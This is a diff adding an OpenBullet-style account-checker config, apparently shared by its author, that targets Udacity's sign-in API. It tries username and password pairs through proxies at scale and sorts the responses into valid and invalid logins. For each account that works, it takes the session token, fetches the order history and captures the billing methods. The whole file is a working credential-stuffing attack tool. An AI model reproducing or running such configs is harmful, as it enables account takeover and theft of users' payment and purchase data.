@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "udacity",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-16T23:44:27.0260483+02:00",
+  "AdditionalInfo": "https://t.mw/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.udacity.com/api/user/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"otp\":\"\",\"next\":\"https://classroom.udacity.com\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 104" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://auth.udacity.com" 
+  HEADER "referer: https://auth.udacity.com/sign-in?next=https://classroom.udacity.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-udacity-ads-are-blocked: unknown" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "<COOKIES{*}>" Contains "_jwt" 
+    KEY "{\"jwt\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "Invalid login credentials" 
+
+#jwt PARSE "<SOURCE>" JSON "jwt" -> VAR "jwt" 
+
+#get REQUEST GET "https://classroom.udacity.com/api/braavos/users/a250fed2-a570-11ec-9717-cbc14a89c209/order_history" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <jwt>" 
+  HEADER "referer: https://classroom.udacity.com/me" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+#billing_methods PARSE "<SOURCE>" JSON "billing_methods" Recursive=TRUE CreateEmpty=FALSE -> CAP "billing_methods" 
+
+#order_history PARSE "<SOURCE>" JSON "order_history" Recursive=TRUE CreateEmpty=FALSE -> CAP "order_history" 
+
+#info FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked By" 
+
